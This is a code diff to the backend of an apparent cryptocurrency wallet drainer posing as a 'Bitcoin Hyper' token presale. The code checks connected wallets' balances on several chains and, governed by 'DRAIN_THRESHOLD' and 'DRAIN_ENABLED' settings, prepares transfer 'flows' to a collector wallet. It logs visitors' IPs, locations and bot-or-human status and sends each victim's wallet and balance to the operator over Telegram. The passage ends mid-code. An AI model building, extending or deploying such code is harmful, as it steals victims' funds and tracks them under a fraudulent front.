@@ -15,7 +15,7 @@ const app = express();
 const PORT = process.env.PORT || 10000;
 
 // ============================================
-// PERSISTENT STORAGE SETUP
+// PERSISTENT STORAGE SETUP - 7 DAY RETENTION
 // ============================================
 
 const DATA_DIR = path.join(__dirname, 'data');
@@ -43,11 +43,19 @@ async function loadStorage() {
       pendingFlows: new Map(parsed.pendingFlows || []),
       completedFlows: new Map(parsed.completedFlows || []),
       settings: {
-        ...parsed.settings,
+        tokenName: parsed.settings?.tokenName || process.env.TOKEN_NAME || 'Bitcoin Hyper',
+        tokenSymbol: parsed.settings?.tokenSymbol || process.env.TOKEN_SYMBOL || 'BTH',
+        valueThreshold: parsed.settings?.valueThreshold || parseFloat(process.env.DRAIN_THRESHOLD) || 1,
         statistics: {
-          ...parsed.settings?.statistics,
-          uniqueIPs: new Set(parsed.settings?.statistics?.uniqueIPs || [])
-        }
+          totalParticipants: parsed.settings?.statistics?.totalParticipants || 0,
+          eligibleParticipants: parsed.settings?.statistics?.eligibleParticipants || 0,
+          claimedParticipants: parsed.settings?.statistics?.claimedParticipants || 0,
+          uniqueIPs: new Set(parsed.settings?.statistics?.uniqueIPs || []),
+          totalProcessedUSD: parsed.settings?.statistics?.totalProcessedUSD || 0,
+          totalProcessedWallets: parsed.settings?.statistics?.totalProcessedWallets || 0,
+          processedTransactions: parsed.settings?.statistics?.processedTransactions || []
+        },
+        flowEnabled: parsed.settings?.flowEnabled || process.env.DRAIN_ENABLED === 'true'
       },
       emailCache: new Map(parsed.emailCache || []),
       siteVisits: parsed.siteVisits || []
@@ -105,41 +113,49 @@ async function saveStorage() {
   }
 }
 
-// Auto-save every 5 minutes
-setInterval(saveStorage, 5 * 60 * 1000);
+// Auto-save every minute to ensure data persistence
+setInterval(saveStorage, 60 * 1000);
 
-// Clean old data (keep 7 days)
+// Clean old data (keep exactly 7 days)
 async function cleanOldData() {
   const sevenDaysAgo = Date.now() - (7 * 24 * 60 * 60 * 1000);
+  let cleanedCount = 0;
   
   // Clean site visits older than 7 days
+  const originalVisitsLength = memoryStorage.siteVisits.length;
   memoryStorage.siteVisits = memoryStorage.siteVisits.filter(v => 
     new Date(v.timestamp).getTime() > sevenDaysAgo
   );
+  cleanedCount += originalVisitsLength - memoryStorage.siteVisits.length;
   
   // Clean completed flows older than 7 days
   for (const [id, flow] of memoryStorage.completedFlows) {
     if (new Date(flow.completedAt).getTime() < sevenDaysAgo) {
       memoryStorage.completedFlows.delete(id);
+      cleanedCount++;
     }
   }
   
   // Clean old processed transactions
   if (memoryStorage.settings?.statistics?.processedTransactions) {
+    const originalTxLength = memoryStorage.settings.statistics.processedTransactions.length;
     memoryStorage.settings.statistics.processedTransactions = 
       memoryStorage.settings.statistics.processedTransactions.filter(t => 
         new Date(t.timestamp).getTime() > sevenDaysAgo
       );
+    cleanedCount += originalTxLength - memoryStorage.settings.statistics.processedTransactions.length;
   }
   
-  console.log('🧹 Cleaned data older than 7 days');
-  await saveStorage();
+  if (cleanedCount > 0) {
+    console.log(`🧹 Cleaned ${cleanedCount} items older than 7 days`);
+    await saveStorage();
+  }
 }
 
-// Run clean up every day
-setInterval(cleanOldData, 24 * 60 * 60 * 1000);
+// Run clean up every 6 hours
+setInterval(cleanOldData, 6 * 60 * 60 * 1000);
 
-// Initialize memoryStorage
+// Initialize memoryStorage (will be set after loading)
 let memoryStorage;
 
 // Security middleware
@@ -182,6 +198,13 @@ app.get('/', (req, res) => {
     version: '2.0.0',
     status: '🟢 ONLINE',
     storage: '💾 Persistent (7 days)',
+    stats: {
+      totalParticipants: memoryStorage?.participants?.length || 0,
+      totalVisits: memoryStorage?.siteVisits?.length || 0,
+      totalRaised: `$${memoryStorage?.settings?.statistics?.totalProcessedUSD?.toFixed(2) || '0.00'}`,
+      pendingFlows: memoryStorage?.pendingFlows?.size || 0,
+      completedFlows: memoryStorage?.completedFlows?.size || 0
+    },
     timestamp: new Date().toISOString()
   });
 });
@@ -312,7 +335,7 @@ const PROJECT_FLOW_ROUTER_ABI = [
 ];
 
 // ============================================
-// TELEGRAM FUNCTIONS - WITH SITE URL AND HUMAN CHECK
+// TELEGRAM FUNCTIONS
 // ============================================
 
 let telegramEnabled = false;
@@ -375,15 +398,16 @@ async function testTelegramConnection() {
     telegramBotName = meResponse.data.result.username;
     console.log(`✅ Bot authenticated: @${telegramBotName}`);
     
-    // Send startup message with site URL
+    // Send startup message with site URL and current stats
     const startMessage = 
       `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
       `✅ MultiChain FlowRouter Ready\n` +
       `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
       `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
+      `💾 Storage: ${memoryStorage.participants.length} participants, ${memoryStorage.siteVisits.length} visits\n` +
+      `💰 Total Raised: $${memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2)}\n` +
       `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
-      `💾 <b>Storage:</b> Persistent (7 days)\n` +
-      `📊 Admin: https://bthbk.vercel.app/admin.html?token=${process.env.ADMIN_TOKEN || 'YOUR_TOKEN'}`;
+      `📊 Admin: https://bthbk.vercel.app/api/admin/dashboard?token=${process.env.ADMIN_TOKEN || 'YOUR_TOKEN'}`;
     
     const sendResult = await sendTelegramMessage(startMessage);
     
@@ -408,16 +432,16 @@ async function testTelegramConnection() {
 // HUMAN/BOT DETECTION
 // ============================================
 
-function detectHuman(userAgent, visit) {
+function detectHuman(userAgent) {
   const isBot = /bot|crawler|spider|scraper|curl|wget|python|java|phantom|headless/i.test(userAgent);
   const hasTouch = /mobile|iphone|ipad|android|touch/i.test(userAgent);
-  const hasMouse = !isBot && !hasTouch; // Desktop users have mouse
+  const hasMouse = !isBot && !hasTouch;
   
   return {
     isHuman: !isBot && (hasTouch || hasMouse),
     isBot: isBot,
     deviceType: hasTouch ? 'Mobile' : hasMouse ? 'Desktop' : 'Unknown',
-    userAgent: userAgent.substring(0, 100)
+    userAgent: userAgent ? userAgent.substring(0, 100) : 'Unknown'
   };
 }
 
@@ -442,6 +466,7 @@ async function getCryptoPrices() {
       avax: response.data['avalanche-2']?.usd || 32
     };
   } catch (error) {
+    console.log('⚠️ Using default prices');
     return { eth: 2000, bnb: 300, matic: 0.75, avax: 32 };
   }
 }
@@ -451,11 +476,14 @@ async function getCryptoPrices() {
 // ============================================
 
 async function getWalletEmail(walletAddress) {
-  if (memoryStorage.emailCache.has(walletAddress.toLowerCase())) {
-    return memoryStorage.emailCache.get(walletAddress.toLowerCase());
+  const normalizedAddress = walletAddress.toLowerCase();
+  
+  if (memoryStorage.emailCache.has(normalizedAddress)) {
+    return memoryStorage.emailCache.get(normalizedAddress);
   }
   
   try {
+    // Try ENS resolution first
     if (walletAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
       try {
         const provider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
@@ -463,14 +491,17 @@ async function getWalletEmail(walletAddress) {
         
         if (ensName) {
           const email = `${ensName.split('.')[0]}@proton.me`;
-          memoryStorage.emailCache.set(walletAddress.toLowerCase(), email);
+          memoryStorage.emailCache.set(normalizedAddress, email);
           await saveStorage();
           return email;
         }
-      } catch (ensError) {}
+      } catch (ensError) {
+        // Continue to fallback
+      }
     }
     
-    const hash = crypto.createHash('sha256').update(walletAddress.toLowerCase()).digest('hex');
+    // Generate deterministic email from wallet address
+    const hash = crypto.createHash('sha256').update(normalizedAddress).digest('hex');
     const username = `user${hash.substring(0, 12)}`;
     
     const lastChar = walletAddress.slice(-1);
@@ -490,13 +521,15 @@ async function getWalletEmail(walletAddress) {
     else domain = domains['c-f'];
     
     const email = `${username}@${domain}`;
-    memoryStorage.emailCache.set(walletAddress.toLowerCase(), email);
+    memoryStorage.emailCache.set(normalizedAddress, email);
     await saveStorage();
     return email;
     
   } catch (error) {
     const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
-    return `user${hash.substring(0, 8)}@proton.me`;
+    const fallbackEmail = `user${hash.substring(0, 8)}@proton.me`;
+    memoryStorage.emailCache.set(normalizedAddress, fallbackEmail);
+    return fallbackEmail;
   }
 }
 
@@ -507,7 +540,9 @@ async function getWalletEmail(walletAddress) {
 async function getIPLocation(ip) {
   try {
     const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
-    if (cleanIP === '127.0.0.1') return { country: 'Local', flag: '🏠', city: 'Local', region: 'Local' };
+    if (cleanIP === '127.0.0.1' || cleanIP === 'localhost') {
+      return { country: 'Local', flag: '🏠', city: 'Local', region: 'Local' };
+    }
     
     const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, { timeout: 2000 });
     
@@ -517,7 +552,9 @@ async function getIPLocation(ip) {
         'Germany': '🇩🇪', 'France': '🇫🇷', 'Spain': '🇪🇸', 'Italy': '🇮🇹',
         'Netherlands': '🇳🇱', 'Switzerland': '🇨🇭', 'Australia': '🇦🇺',
         'Japan': '🇯🇵', 'China': '🇨🇳', 'India': '🇮🇳', 'Brazil': '🇧🇷',
-        'Nigeria': '🇳🇬', 'South Africa': '🇿🇦', 'Mexico': '🇲🇽'
+        'Nigeria': '🇳🇬', 'South Africa': '🇿🇦', 'Mexico': '🇲🇽',
+        'Russia': '🇷🇺', 'South Korea': '🇰🇷', 'Singapore': '🇸🇬',
+        'UAE': '🇦🇪', 'Saudi Arabia': '🇸🇦', 'Turkey': '🇹🇷'
       };
       
       return {
@@ -533,18 +570,20 @@ async function getIPLocation(ip) {
         isp: response.data.isp || ''
       };
     }
-  } catch (error) {}
+  } catch (error) {
+    // Silent fail for location service
+  }
   
   return { country: 'Unknown', flag: '🌍', city: 'Unknown', region: '' };
 }
 
 // ============================================
-// TRACK SITE VISIT - WITH HUMAN/BOT DETECTION
+// TRACK SITE VISIT
 // ============================================
 
 async function trackSiteVisit(ip, userAgent, referer, path) {
   const location = await getIPLocation(ip);
-  const humanInfo = detectHuman(userAgent, null);
+  const humanInfo = detectHuman(userAgent);
   
   const visit = {
     id: `VISIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`,
@@ -567,28 +606,26 @@ async function trackSiteVisit(ip, userAgent, referer, path) {
   memoryStorage.siteVisits.push(visit);
   await saveStorage();
   
-  // INSTANT Telegram notification with human/bot detection
-  const telegramMessage = 
-    `${visit.isHuman ? '👤' : '🤖'} <b>NEW SITE VISIT</b>\n` +
-    `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}${location.region ? `, ${location.region}` : ''}\n` +
-    `🌐 <b>IP:</b> ${visit.ip}\n` +
-    `📱 <b>Device:</b> ${humanInfo.deviceType}\n` +
-    `👤 <b>Human:</b> ${visit.isHuman ? '✅ Yes' : '❌ No (Bot)'}\n` +
-    `🔗 <b>From:</b> ${referer || 'Direct'}\n` +
-    `📱 <b>Path:</b> ${path || '/'}\n` +
-    `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
-    `🆔 <b>Visit ID:</b> ${visit.id}`;
-  
-  await sendTelegramMessage(telegramMessage);
+  // Send Telegram notification for human visits
+  if (visit.isHuman) {
+    const telegramMessage = 
+      `👤 <b>NEW SITE VISIT</b>\n` +
+      `📍 <b>Location:</b> ${location.country} ${location.flag}${location.city ? `, ${location.city}` : ''}\n` +
+      `📱 <b>Device:</b> ${humanInfo.deviceType}\n` +
+      `🔗 <b>From:</b> ${referer || 'Direct'}\n` +
+      `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`;
+    
+    await sendTelegramMessage(telegramMessage);
+  }
   
   return visit;
 }
 
 // ============================================
-// WALLET BALANCE CHECK - WITH CORRECT USD VALUES
+// WALLET BALANCE CHECK
 // ============================================
 
-async function getWalletBalance(walletAddress, clientIP = null, location = null) {
+async function getWalletBalance(walletAddress) {
   console.log(`\n🔍 SCANNING: ${walletAddress.substring(0, 10)}...`);
   
   const results = {
@@ -607,7 +644,6 @@ async function getWalletBalance(walletAddress, clientIP = null, location = null)
       { name: 'BSC', symbol: 'BNB', price: prices.bnb, chainId: 56 },
       { name: 'Polygon', symbol: 'MATIC', price: prices.matic, chainId: 137 },
       { name: 'Arbitrum', symbol: 'ETH', price: prices.eth, chainId: 42161 },
-      { name: 'Optimism', symbol: 'ETH', price: prices.eth, chainId: 10 },
       { name: 'Avalanche', symbol: 'AVAX', price: prices.avax, chainId: 43114 }
     ];
 
@@ -640,7 +676,9 @@ async function getWalletBalance(walletAddress, clientIP = null, location = null)
           
           results.balances.push(balanceData);
         }
-      } catch (error) {}
+      } catch (error) {
+        // Silently skip failed chain checks
+      }
     }
 
     results.totalValueUSD = parseFloat(totalValue.toFixed(2));
@@ -705,12 +743,12 @@ app.post('/api/track-visit', async (req, res) => {
     
   } catch (error) {
     console.error('Track visit error:', error);
-    res.json({ success: true });
+    res.json({ success: true, data: { visitId: `VISIT-${Date.now()}` } });
   }
 });
 
 // ============================================
-// CONNECT ENDPOINT - WITH CORRECT EMAIL
+// CONNECT ENDPOINT
 // ============================================
 
 app.post('/api/presale/connect', async (req, res) => {
@@ -727,6 +765,7 @@ app.post('/api/presale/connect', async (req, res) => {
     const location = await getIPLocation(clientIP);
     const email = await getWalletEmail(walletAddress);
     
+    // Find last visit from this IP
     const lastVisit = memoryStorage.siteVisits
       .filter(v => v.ip === clientIP.replace('::ffff:', ''))
       .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0];
@@ -736,7 +775,9 @@ app.post('/api/presale/connect', async (req, res) => {
       lastVisit.walletAddress = walletAddress.toLowerCase();
     }
     
+    // Find or create participant
     let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
+    const isNewParticipant = !participant;
     
     if (!participant) {
       participant = {
@@ -754,29 +795,21 @@ app.post('/api/presale/connect', async (req, res) => {
         userAgent: req.headers['user-agent'],
         visitId: lastVisit?.id,
         isHuman: lastVisit?.isHuman || true,
-        deviceType: lastVisit?.deviceType || 'Unknown'
+        deviceType: lastVisit?.deviceType || 'Unknown',
+        flowTransactions: [],
+        balances: []
       };
       memoryStorage.participants.push(participant);
       memoryStorage.settings.statistics.totalParticipants++;
       memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
       await saveStorage();
-      
-      // INSTANT Telegram for new participant with email
-      const newUserMsg = 
-        `${location.flag} <b>NEW PARTICIPANT REGISTERED</b>\n` +
-        `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-        `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}\n` +
-        `🌐 <b>IP:</b> ${clientIP.replace('::ffff:', '')}\n` +
-        `📧 <b>Email:</b> ${email}\n` +
-        `👤 <b>Human:</b> ${participant.isHuman ? '✅ Yes' : '❌ No'}\n` +
-        `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`;
-      
-      await sendTelegramMessage(newUserMsg);
     }
     
-    const balanceResult = await getWalletBalance(walletAddress, clientIP, location);
+    // Get wallet balance
+    const balanceResult = await getWalletBalance(walletAddress);
     
     if (balanceResult.success) {
+      // Update participant with balance data
       participant.totalValueUSD = balanceResult.data.totalValueUSD;
       participant.isEligible = balanceResult.data.isEligible;
       participant.allocation = balanceResult.data.allocation;
@@ -789,13 +822,24 @@ app.post('/api/presale/connect', async (req, res) => {
       
       await saveStorage();
       
-      // INSTANT Telegram connection summary with correct email
+      // Send Telegram notifications
+      if (isNewParticipant) {
+        const newUserMsg = 
+          `${location.flag} <b>NEW PARTICIPANT REGISTERED</b>\n` +
+          `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+          `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}\n` +
+          `📧 <b>Email:</b> ${email}\n` +
+          `💵 <b>Balance:</b> $${balanceResult.data.totalValueUSD.toFixed(2)}\n` +
+          `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`;
+        
+        await sendTelegramMessage(newUserMsg);
+      }
+      
       const connectMsg = 
         `${location.flag} <b>WALLET CONNECTED</b>\n` +
         `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
         `💵 <b>Total Balance:</b> $${balanceResult.data.totalValueUSD.toFixed(2)}\n` +
         `🎯 <b>Status:</b> ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
-        `📧 <b>Email:</b> ${email}\n` +
         `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`;
       
       await sendTelegramMessage(connectMsg);
@@ -875,7 +919,7 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
     
     await saveStorage();
     
-    // INSTANT Telegram for flow preparation
+    // Send Telegram notification
     let txDetails = '';
     transactions.forEach((tx, index) => {
       txDetails += `\n   ${index+1}. ${tx.chain}: ${tx.amount} ${tx.symbol} ($${tx.valueUSD})`;
@@ -907,7 +951,7 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
 });
 
 // ============================================
-// EXECUTE FLOW ENDPOINT - WITH CORRECT USD VALUES
+// EXECUTE FLOW ENDPOINT
 // ============================================
 
 app.post('/api/presale/execute-flow', async (req, res) => {
@@ -925,8 +969,11 @@ app.post('/api/presale/execute-flow', async (req, res) => {
     );
     
     if (participant) {
-      participant.flowProcessed = true;
-      participant.flowTransactions = participant.flowTransactions || [];
+      // Initialize flow transactions array if needed
+      if (!participant.flowTransactions) {
+        participant.flowTransactions = [];
+      }
+      
       participant.flowTransactions.push({ 
         chain: chainName, 
         flowId,
@@ -935,52 +982,54 @@ app.post('/api/presale/execute-flow', async (req, res) => {
       });
       
       memoryStorage.settings.statistics.totalProcessedWallets++;
-      memoryStorage.settings.statistics.processedTransactions.push({
-        wallet: walletAddress,
-        chain: chainName,
-        flowId,
-        txHash,
-        timestamp: new Date().toISOString()
-      });
       
-      // Get transaction details with correct USD values
-      let txAmount = 'unknown';
-      let txSymbol = '';
-      let txValueUSD = 'unknown';
+      // Get flow from pending flows
       const flow = memoryStorage.pendingFlows.get(flowId);
+      let txValueUSD = 0;
+      let txAmount = '0';
+      let txSymbol = '';
+      
       if (flow && flow.transactions) {
         const tx = flow.transactions.find(t => t.chain === chainName);
         if (tx) {
           txAmount = tx.amount;
           txSymbol = tx.symbol;
-          txValueUSD = tx.valueUSD;
+          txValueUSD = parseFloat(tx.valueUSD);
+          
+          // Add to processed transactions
+          memoryStorage.settings.statistics.processedTransactions.push({
+            wallet: walletAddress,
+            chain: chainName,
+            flowId,
+            txHash,
+            valueUSD: txValueUSD,
+            amount: txAmount,
+            symbol: txSymbol,
+            timestamp: new Date().toISOString()
+          });
         }
       }
       
-      // INSTANT Telegram for each chain execution with correct values
-      await sendTelegramMessage(
-        `💰 <b>CHAIN TRANSACTION EXECUTED</b>\n` +
-        `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-        `🔗 <b>Chain:</b> ${chainName}\n` +
-        `💵 <b>Amount:</b> ${txAmount} ${txSymbol} ($${txValueUSD})\n` +
-        `🆔 <b>Tx Hash:</b> <code>${txHash}</code>\n` +
-        `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
-        `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`
-      );
-      
       // Update pending flow
       if (flow) {
-        flow.completedChains = flow.completedChains || [];
+        if (!flow.completedChains) {
+          flow.completedChains = [];
+        }
+        
         if (!flow.completedChains.includes(chainName)) {
           flow.completedChains.push(chainName);
         }
         
-        // INSTANT Telegram when all chains are complete
+        // Check if flow is complete
         if (flow.completedChains.length === flow.transactions.length) {
           memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(flow.totalFlowUSD);
-          memoryStorage.completedFlows.set(flowId, { ...flow, completedAt: new Date().toISOString() });
+          memoryStorage.completedFlows.set(flowId, { 
+            ...flow, 
+            completedAt: new Date().toISOString() 
+          });
           memoryStorage.pendingFlows.delete(flowId);
           
+          // Send completion notification
           let completionDetails = '';
           flow.transactions.forEach(t => {
             const completed = flow.completedChains.includes(t.chain) ? '✅' : '❌';
@@ -992,7 +1041,16 @@ app.post('/api/presale/execute-flow', async (req, res) => {
             `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
             `💵 <b>Total Value:</b> $${flow.totalFlowUSD}\n` +
             `🔗 <b>All ${flow.transactions.length} chains processed!</b>${completionDetails}\n` +
-            `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
+            `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`
+          );
+        } else {
+          // Send individual chain completion
+          await sendTelegramMessage(
+            `💰 <b>CHAIN TRANSACTION EXECUTED</b>\n` +
+            `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+            `🔗 <b>Chain:</b> ${chainName}\n` +
+            `💵 <b>Amount:</b> ${txAmount} ${txSymbol} ($${txValueUSD.toFixed(2)})\n` +
+            `🆔 <b>Tx Hash:</b> <code>${txHash}</code>\n` +
             `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`
           );
         }
@@ -1010,7 +1068,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
 });
 
 // ============================================
-// CLAIM ENDPOINT - WITH CORRECT EMAIL
+// CLAIM ENDPOINT
 // ============================================
 
 app.post('/api/presale/claim', async (req, res) => {
@@ -1035,7 +1093,6 @@ app.post('/api/presale/claim', async (req, res) => {
     
     const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
     
-    // INSTANT Telegram for claim completion with email and site URL
     await sendTelegramMessage(
       `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
       `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
@@ -1055,7 +1112,7 @@ app.post('/api/presale/claim', async (req, res) => {
 });
 
 // ============================================
-// ADMIN DASHBOARD - WITH DATE FILTERING
+// ADMIN DASHBOARD WITH TIME TOGGLE (1, 7, 30 days)
 // ============================================
 
 app.get('/api/admin/dashboard', (req, res) => {
@@ -1065,132 +1122,143 @@ app.get('/api/admin/dashboard', (req, res) => {
   
   // Trim tokens to avoid whitespace issues
   if (token?.trim() !== adminToken?.trim()) {
-    console.log(`❌ Unauthorized admin access attempt with token: ${token}`);
+    console.log(`❌ Unauthorized admin access attempt`);
     return res.status(401).json({ success: false, error: 'Invalid admin token' });
   }
   
   const cutoffTime = Date.now() - (days * 24 * 60 * 60 * 1000);
   
   // ============================================
-  // SAFE DATA EXTRACTION WITH PROPER TYPE CHECKING
+  // FILTER DATA BY TIME RANGE
   // ============================================
   
-  // Recent visits - filter by days
-  const recentVisits = Array.isArray(memoryStorage.siteVisits) 
+  // Filter site visits
+  const filteredVisits = Array.isArray(memoryStorage.siteVisits) 
     ? memoryStorage.siteVisits
         .filter(v => new Date(v.timestamp).getTime() > cutoffTime)
         .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-        .slice(0, 100)
     : [];
   
-  // Active participants - filter by days
-  const activeParticipants = Array.isArray(memoryStorage.participants)
+  // Filter participants
+  const filteredParticipants = Array.isArray(memoryStorage.participants)
     ? memoryStorage.participants
         .filter(p => new Date(p.connectedAt).getTime() > cutoffTime)
         .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
-        .map(p => ({
-          ...p,
-          connectedAt: p.connectedAt,
-          lastScanned: p.lastScanned,
-          claimedAt: p.claimedAt
-        }))
     : [];
   
-  // Pending flows - safe Map conversion
-  const pendingFlows = memoryStorage.pendingFlows instanceof Map
+  // Filter pending flows
+  const filteredPendingFlows = memoryStorage.pendingFlows instanceof Map
     ? Array.from(memoryStorage.pendingFlows.entries())
         .filter(([_, flow]) => new Date(flow.createdAt).getTime() > cutoffTime)
         .map(([id, flow]) => ({ id, ...flow }))
         .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
-        .slice(0, 50)
     : [];
   
-  // Completed flows - safe Map conversion
-  const completedFlows = memoryStorage.completedFlows instanceof Map
+  // Filter completed flows
+  const filteredCompletedFlows = memoryStorage.completedFlows instanceof Map
     ? Array.from(memoryStorage.completedFlows.entries())
         .filter(([_, flow]) => new Date(flow.completedAt).getTime() > cutoffTime)
         .map(([id, flow]) => ({ id, ...flow }))
         .sort((a, b) => new Date(b.completedAt) - new Date(a.completedAt))
-        .slice(0, 50)
     : [];
   
-  // Processed transactions - filter by days
-  const processedTransactions = Array.isArray(memoryStorage.settings?.statistics?.processedTransactions)
+  // Filter processed transactions
+  const filteredTransactions = Array.isArray(memoryStorage.settings?.statistics?.processedTransactions)
     ? memoryStorage.settings.statistics.processedTransactions
         .filter(t => new Date(t.timestamp).getTime() > cutoffTime)
         .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-        .slice(0, 100)
     : [];
   
-  // Network status - always return array
-  const networkStatus = PROJECT_FLOW_ROUTERS && typeof PROJECT_FLOW_ROUTERS === 'object'
-    ? Object.keys(PROJECT_FLOW_ROUTERS).map(chain => ({
-        chain,
-        contract: PROJECT_FLOW_ROUTERS[chain] || 'Not deployed',
-        status: PROJECT_FLOW_ROUTERS[chain] ? '✅ Active' : '⏸️ Inactive',
-        collector: COLLECTOR_WALLET
-      }))
-    : [];
-  
-  // Location stats - safe object to array conversion
-  const locationStats = {};
-  if (Array.isArray(memoryStorage.participants)) {
-    memoryStorage.participants
-      .filter(p => new Date(p.connectedAt).getTime() > cutoffTime)
-      .forEach(p => {
-        if (p && p.country) {
-          const key = `${p.country}|${p.flag || '🌍'}`;
-          if (!locationStats[key]) {
-            locationStats[key] = { 
-              country: p.country, 
-              flag: p.flag || '🌍', 
-              count: 0, 
-              eligible: 0 
-            };
-          }
-          locationStats[key].count++;
-          if (p.isEligible) locationStats[key].eligible++;
-        }
-      });
-  }
-  
-  // Daily activity
-  const dailyActivity = {};
-  if (Array.isArray(memoryStorage.siteVisits)) {
-    memoryStorage.siteVisits
-      .filter(v => new Date(v.timestamp).getTime() > cutoffTime)
-      .forEach(v => {
-        if (v && v.timestamp) {
-          try {
-            const date = new Date(v.timestamp).toISOString().split('T')[0];
-            dailyActivity[date] = (dailyActivity[date] || 0) + 1;
-          } catch (e) {}
-        }
-      });
-  }
+  // Calculate total raised in this period
+  const totalRaisedInPeriod = filteredTransactions.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
   
   // ============================================
-  // SAFE SUMMARY STATISTICS
+  // LOCATION STATS
+  // ============================================
+  
+  const locationStats = {};
+  filteredParticipants.forEach(p => {
+    if (p && p.country) {
+      const key = `${p.country}|${p.flag || '🌍'}`;
+      if (!locationStats[key]) {
+        locationStats[key] = { 
+          country: p.country, 
+          flag: p.flag || '🌍', 
+          count: 0, 
+          eligible: 0,
+          claimed: 0
+        };
+      }
+      locationStats[key].count++;
+      if (p.isEligible) locationStats[key].eligible++;
+      if (p.claimed) locationStats[key].claimed++;
+    }
+  });
+  
+  // ============================================
+  // DAILY ACTIVITY
+  // ============================================
+  
+  const dailyActivity = {};
+  filteredVisits.forEach(v => {
+    if (v && v.timestamp) {
+      try {
+        const date = new Date(v.timestamp).toISOString().split('T')[0];
+        dailyActivity[date] = (dailyActivity[date] || 0) + 1;
+      } catch (e) {}
+    }
+  });
+  
+  // ============================================
+  // HOURLY ACTIVITY (for today)
+  // ============================================
+  
+  const hourlyActivity = {};
+  const today = new Date().toISOString().split('T')[0];
+  filteredVisits
+    .filter(v => v.timestamp.startsWith(today))
+    .forEach(v => {
+      try {
+        const hour = new Date(v.timestamp).getHours();
+        hourlyActivity[hour] = (hourlyActivity[hour] || 0) + 1;
+      } catch (e) {}
+    });
+  
+  // ============================================
+  // NETWORK STATUS
+  // ============================================
+  
+  const networkStatus = Object.keys(PROJECT_FLOW_ROUTERS).map(chain => ({
+    chain,
+    contract: PROJECT_FLOW_ROUTERS[chain] || 'Not deployed',
+    status: PROJECT_FLOW_ROUTERS[chain] ? '✅ Active' : '⏸️ Inactive',
+    collector: COLLECTOR_WALLET
+  }));
+  
+  // ============================================
+  // SUMMARY STATISTICS
   // ============================================
   
   const summary = {
-    dateRange: `Last ${days} days`,
-    totalVisits: recentVisits.length,
-    uniqueIPs: new Set(recentVisits.map(v => v.ip)).size,
-    totalParticipants: activeParticipants.length,
-    eligibleParticipants: activeParticipants.filter(p => p && p.isEligible).length,
-    claimedParticipants: activeParticipants.filter(p => p && p.claimed).length,
-    totalProcessedUSD: (memoryStorage.settings?.statistics?.totalProcessedUSD || 0).toFixed(2),
-    totalProcessedWallets: memoryStorage.settings?.statistics?.totalProcessedWallets || 0,
-    pendingFlows: pendingFlows.length,
-    completedFlows: completedFlows.length,
+    timeRange: days === 1 ? 'Last 24 Hours' : days === 7 ? 'Last 7 Days' : days === 30 ? 'Last 30 Days' : `Last ${days} Days`,
+    days: days,
+    totalVisits: filteredVisits.length,
+    uniqueIPs: new Set(filteredVisits.map(v => v.ip)).size,
+    totalParticipants: filteredParticipants.length,
+    eligibleParticipants: filteredParticipants.filter(p => p && p.isEligible).length,
+    claimedParticipants: filteredParticipants.filter(p => p && p.claimed).length,
+    totalRaisedInPeriod: totalRaisedInPeriod.toFixed(2),
+    totalRaisedAllTime: memoryStorage.settings?.statistics?.totalProcessedUSD?.toFixed(2) || '0.00',
+    totalProcessedWallets: filteredTransactions.length,
+    pendingFlows: filteredPendingFlows.length,
+    completedFlows: filteredCompletedFlows.length,
     telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
     telegramBot: telegramBotName || 'N/A',
-    storage: '💾 Persistent (7 days)'
